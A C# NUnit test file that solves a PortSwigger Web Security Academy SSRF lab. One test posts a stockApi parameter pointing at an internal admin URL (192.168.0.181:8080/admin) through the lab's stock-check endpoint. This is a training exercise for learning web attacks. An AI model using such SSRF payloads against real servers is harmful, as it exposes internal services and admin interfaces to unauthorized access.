using System.Net;

namespace TestProject1._2._SSRF;

/// <summary>
/// Lab: Basic SSRF against another back-end system
/// Url: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
/// </summary>
internal class SSRFTest
{
    private const string YourUniqueLabId = "<your-unique-lab-id>";

    private HttpClient httpClient = null;

    [SetUp]
    public void Setup()
    {
        SetupHttpClientContext();
    }

    private void SetupHttpClientContext()
    {
        httpClient = new HttpClient
        {
            BaseAddress = new Uri($"https://{YourUniqueLabId}.web-security-academy.net/")
        };
    }

    [Test]
    public async Task ValidateNormalRequestsWorks()
    {
        var test = new FormUrlEncodedContent(new Dictionary<string, string>
        {
            { "stockApi", "http://192.168.0.1:8080/product/stock/check?productId=3&storeId=1" }
        });

        var result = await httpClient.PostAsync("/product/stock", test);

        Assert.That(result.StatusCode, Is.EqualTo(HttpStatusCode.OK));
    }

    [Test]
    public async Task ValidateSSRFWorks()
    {
        var test = new FormUrlEncodedContent(new Dictionary<string, string>
        {
            { "stockApi", "http://192.168.0.181:8080/admin" }
        });

        var result = await httpClient.PostAsync("/product/stock", test);

        Assert.That(result.StatusCode, Is.EqualTo(HttpStatusCode.OK));
    }
}
